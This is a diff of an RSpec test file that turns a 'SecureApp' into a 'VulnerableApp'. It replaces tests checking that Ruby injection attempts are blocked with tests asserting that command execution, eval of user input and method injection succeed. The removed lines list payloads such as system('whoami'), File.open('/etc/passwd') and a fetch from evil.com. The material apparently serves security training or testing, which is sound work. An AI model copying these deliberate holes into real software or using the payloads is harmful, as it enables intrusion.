@@ -1,60 +1,82 @@
 require 'spec_helper'
 
-RSpec.describe SecureApp do
+RSpec.describe VulnerableApp do
   describe 'GET /' do
-    it 'renders the home page' do
+    it 'renders the e-commerce home page' do
       get '/'
       expect(last_response).to be_ok
-      expect(last_response.body).to include('Secure Ruby Injection Prevention Demo')
+      expect(last_response.body).to include('Ruby E-Commerce Platform')
     end
   end
 
-  describe 'GET /demo/cache' do
-    it 'returns successful cache operations' do
-      get '/demo/cache'
+  describe 'GET /products/search' do
+    it 'allows product search with method injection' do
+      get '/products/search?method=title'
       expect(last_response).to be_ok
       
       json_response = JSON.parse(last_response.body)
       expect(json_response['status']).to eq('success')
-      expect(json_response['data']).to include('user_name', 'user_email', 'product_title')
+      expect(json_response['method_called']).to eq('title')
+      expect(json_response['results']).to be_an(Array)
+    end
+
+    it 'allows dangerous method calls via injection' do
+      get '/products/search?method=class'
+      expect(last_response).to be_ok
+      
+      json_response = JSON.parse(last_response.body)
+      expect(json_response['status']).to eq('success')
+      expect(json_response['method_called']).to eq('class')
+      expect(json_response['results'][0]['data']).to eq('Product')
     end
   end
 
-  describe 'GET /demo/cache/unsafe' do
-    it 'blocks unsafe method calls' do
-      get '/demo/cache/unsafe?method=system'
+  describe 'GET /admin/tools' do
+    it 'executes system commands successfully' do
+      get '/admin/tools?command=echo hello'
       expect(last_response).to be_ok
       
       json_response = JSON.parse(last_response.body)
       expect(json_response['status']).to eq('success')
-      expect(json_response['message']).to include('Security validation worked!')
-      expect(json_response['error']).to include('not in the safe methods list')
+      expect(json_response['message']).to include('Admin command executed')
+      expect(json_response['command']).to eq('echo hello')
     end
 
-    it 'blocks eval attempts' do
-      get '/demo/cache/unsafe?method=eval'
+    it 'allows command injection' do
+      get '/admin/tools?command=whoami'
       expect(last_response).to be_ok
       
       json_response = JSON.parse(last_response.body)
       expect(json_response['status']).to eq('success')
-      expect(json_response['error']).to include('not in the safe methods list')
-    end
-
-    it 'blocks backtick execution' do
-      get '/demo/cache/unsafe?method=`'
-      expect(last_response).to be_ok
-      
-      json_response = JSON.parse(last_response.body)
-      expect(json_response['status']).to eq('success')
-      expect(json_response['error']).to include('not in the safe methods list')
+      expect(json_response['command']).to eq('whoami')
     end
   end
 
   describe 'GET /checkout' do
-    it 'renders the checkout page' do
+    it 'renders the e-commerce checkout page' do
       get '/checkout'
       expect(last_response).to be_ok
-      expect(last_response.body).to include('Secure Checkout System Demo')
+      expect(last_response.body).to include('E-Commerce Checkout')
+    end
+  end
+
+  describe 'GET /user/profile' do
+    it 'allows code execution via user profile' do
+      get '/user/profile?code=name'
+      expect(last_response).to be_ok
+      
+      json_response = JSON.parse(last_response.body)
+      expect(json_response['status']).to eq('success')
+      expect(json_response['result']).to eq('John Doe')
+    end
+
+    it 'executes arbitrary code successfully' do
+      get '/user/profile?code=class.name'
+      expect(last_response).to be_ok
+      
+      json_response = JSON.parse(last_response.body)
+      expect(json_response['status']).to eq('success')
+      expect(json_response['result']).to eq('User')
     end
   end
 
@@ -68,67 +90,51 @@ RSpec.describe SecureApp do
       expect(json_response['checkout_info']['current_step']).to eq('shipping')
     end
 
-    it 'advances to specific valid step' do
-      post '/checkout/advance', step: 'payment'
+    it 'accepts arbitrary step input' do
+      post '/checkout/advance', step: 'malicious_step'
       expect(last_response).to be_ok
       
       json_response = JSON.parse(last_response.body)
       expect(json_response['status']).to eq('success')
-      expect(json_response['checkout_info']['current_step']).to eq('payment')
-    end
-
-    it 'rejects invalid steps' do
-      post '/checkout/advance', step: 'invalid_step'
-      expect(last_response).to be_ok
-      
-      json_response = JSON.parse(last_response.body)
-      expect(json_response['status']).to eq('error')
-      expect(json_response['message']).to include('Invalid step')
+      expect(json_response['checkout_info']['current_step']).to eq('malicious_step')
     end
   end
 
-  describe 'POST /checkout/inject' do
-    it 'blocks system command injection' do
-      post '/checkout/inject', malicious_step: 'system("whoami")'
+  describe 'POST /checkout/custom' do
+    it 'allows custom step injection' do
+      post '/checkout/custom', step: 'injected_step'
       expect(last_response).to be_ok
       
       json_response = JSON.parse(last_response.body)
       expect(json_response['status']).to eq('success')
-      expect(json_response['message']).to include('Injection attempt blocked')
-      expect(json_response['attempted_injection']).to eq('system("whoami")')
-    end
-
-    it 'blocks eval injection' do
-      post '/checkout/inject', malicious_step: 'eval("puts `whoami`")'
-      expect(last_response).to be_ok
-      
-      json_response = JSON.parse(last_response.body)
-      expect(json_response['status']).to eq('success')
-      expect(json_response['message']).to include('Injection attempt blocked')
-    end
-
-    it 'blocks backtick execution' do
-      post '/checkout/inject', malicious_step: '`ls -la`'
-      expect(last_response).to be_ok
-      
-      json_response = JSON.parse(last_response.body)
-      expect(json_response['status']).to eq('success')
-      expect(json_response['message']).to include('Injection attempt blocked')
-    end
-
-    it 'blocks send method manipulation' do
-      post '/checkout/inject', malicious_step: '__send__(:system, "whoami")'
-      expect(last_response).to be_ok
-      
-      json_response = JSON.parse(last_response.body)
-      expect(json_response['status']).to eq('success')
-      expect(json_response['message']).to include('Injection attempt blocked')
+      expect(json_response['custom_step']).to eq('injected_step')
     end
   end
 
-  describe 'GET /api/safe_call' do
-    it 'allows safe method calls on user object' do
-      get '/api/safe_call?object=user&method=name'
+  describe 'POST /checkout/execute' do
+    it 'executes arbitrary Ruby code' do
+      post '/checkout/execute', code: 'puts "test"'
+      expect(last_response).to be_ok
+      
+      json_response = JSON.parse(last_response.body)
+      expect(json_response['status']).to eq('success')
+      expect(json_response['message']).to include('Code executed successfully')
+      expect(json_response['code']).to eq('puts "test"')
+    end
+
+    it 'allows code evaluation vulnerability' do
+      post '/checkout/execute', code: '2 + 2'
+      expect(last_response).to be_ok
+      
+      json_response = JSON.parse(last_response.body)
+      expect(json_response['status']).to eq('success')
+      expect(json_response['result']).to eq(4)
+    end
+  end
+
+  describe 'GET /api/call' do
+    it 'allows method calls on user object' do
+      get '/api/call?object=user&method=name'
       expect(last_response).to be_ok
       
       json_response = JSON.parse(last_response.body)
@@ -136,8 +142,8 @@ RSpec.describe SecureApp do
       expect(json_response['result']).to eq('John Doe')
     end
 
-    it 'allows safe method calls on product object' do
-      get '/api/safe_call?object=product&method=title'
+    it 'allows method calls on product object' do
+      get '/api/call?object=product&method=title'
       expect(last_response).to be_ok
       
       json_response = JSON.parse(last_response.body)
@@ -145,22 +151,22 @@ RSpec.describe SecureApp do
       expect(json_response['result']).to eq('Ruby Book')
     end
 
-    it 'blocks unsafe method calls' do
-      get '/api/safe_call?object=user&method=system'
+    it 'allows dangerous method calls' do
+      get '/api/call?object=user&method=class'
       expect(last_response).to be_ok
       
       json_response = JSON.parse(last_response.body)
-      expect(json_response['status']).to eq('error')
-      expect(json_response['message']).to include('not in the safe methods list')
+      expect(json_response['status']).to eq('success')
+      expect(json_response['result']).to eq('User')
     end
 
-    it 'blocks eval attempts' do
-      get '/api/safe_call?object=user&method=eval'
+    it 'allows method injection' do
+      get '/api/call?object=product&method=class'
       expect(last_response).to be_ok
       
       json_response = JSON.parse(last_response.body)
-      expect(json_response['status']).to eq('error')
-      expect(json_response['message']).to include('not in the safe methods list')
+      expect(json_response['status']).to eq('success')
+      expect(json_response['result']).to eq('Product')
     end
   end
 
@@ -179,102 +185,41 @@ RSpec.describe SecureApp do
     end
   end
 
-  describe 'GET /security' do
-    it 'renders the security documentation page' do
-      get '/security'
+  describe 'vulnerability demonstration' do
+    it 'demonstrates command injection in admin tools' do
+      get '/admin/tools?command=echo "vulnerability test"'
       expect(last_response).to be_ok
-      expect(last_response.body).to include('Security Features Explained')
-      expect(last_response.body).to include('Safe Method Whitelisting')
-      expect(last_response.body).to include('Predefined Steps Array')
-    end
-  end
-
-  describe 'comprehensive injection testing' do
-    let(:injection_payloads) do
-      [
-        # Command execution
-        'system("whoami")',
-        'exec("whoami")',
-        '`whoami`',
-        'Kernel.system("whoami")',
-        
-        # Code evaluation
-        'eval("puts `whoami`")',
-        'instance_eval("system(\'whoami\')")',
-        'class_eval("system(\'whoami\')")',
-        'module_eval("system(\'whoami\')")',
-        
-        # Method manipulation
-        'send(:system, "whoami")',
-        '__send__(:system, "whoami")',
-        'public_send(:system, "whoami")',
-        'method(:system).call("whoami")',
-        
-        # Object manipulation
-        'Object.new.system("whoami")',
-        'Class.new.system("whoami")',
-        'self.class.system("whoami")',
-        
-        # Constant manipulation
-        'Object.const_get(:Kernel).system("whoami")',
-        'const_get(:Kernel).system("whoami")',
-        
-        # File operations
-        'File.open("/etc/passwd")',
-        'IO.popen("whoami")',
-        'open("|whoami")',
-        
-        # Network operations
-        'Net::HTTP.get(URI("http://evil.com"))',
-        'open("http://evil.com")',
-        
-        # Process manipulation
-        'Process.spawn("whoami")',
-        'fork { system("whoami") }',
-        
-        # Environment manipulation
-        'ENV["PATH"] = "/tmp"',
-        '$0 = "malicious"'
-      ]
+      
+      json_response = JSON.parse(last_response.body)
+      expect(json_response['status']).to eq('success')
+      expect(json_response['message']).to include('Admin command executed')
     end
 
-    it 'blocks all injection attempts in checkout steps' do
-      injection_payloads.each do |payload|
-        post '/checkout/inject', malicious_step: payload
-        expect(last_response).to be_ok
-        
-        json_response = JSON.parse(last_response.body)
-        expect(json_response['status']).to eq('success'), 
-          "Failed to block payload: #{payload}"
-        expect(json_response['message']).to include('Injection attempt blocked'),
-          "Failed to block payload: #{payload}"
-      end
+    it 'demonstrates code injection in user profile' do
+      get '/user/profile?code=2*3'
+      expect(last_response).to be_ok
+      
+      json_response = JSON.parse(last_response.body)
+      expect(json_response['status']).to eq('success')
+      expect(json_response['result']).to eq(6)
     end
 
-    it 'blocks all injection attempts in cache method calls' do
-      injection_payloads.each do |payload|
-        get "/demo/cache/unsafe?method=#{CGI.escape(payload)}"
-        expect(last_response).to be_ok
-        
-        json_response = JSON.parse(last_response.body)
-        expect(json_response['status']).to eq('success'),
-          "Failed to block payload: #{payload}"
-        expect(json_response['error']).to include('not in the safe methods list'),
-          "Failed to block payload: #{payload}"
-      end
+    it 'demonstrates method injection in product search' do
+      get '/products/search?method=inspect'
+      expect(last_response).to be_ok
+      
+      json_response = JSON.parse(last_response.body)
+      expect(json_response['status']).to eq('success')
+      expect(json_response['method_called']).to eq('inspect')
     end
 
-    it 'blocks all injection attempts in safe_call API' do
-      injection_payloads.each do |payload|
-        get "/api/safe_call?object=user&method=#{CGI.escape(payload)}"
-        expect(last_response).to be_ok
-        
-        json_response = JSON.parse(last_response.body)
-        expect(json_response['status']).to eq('error'),
-          "Failed to block payload: #{payload}"
-        expect(json_response['message']).to include('not in the safe methods list'),
-          "Failed to block payload: #{payload}"
-      end
+    it 'demonstrates step injection in checkout' do
+      post '/checkout/custom', step: 'malicious_payload'
+      expect(last_response).to be_ok
+      
+      json_response = JSON.parse(last_response.body)
+      expect(json_response['status']).to eq('success')
+      expect(json_response['custom_step']).to eq('malicious_payload')
     end
   end
 end
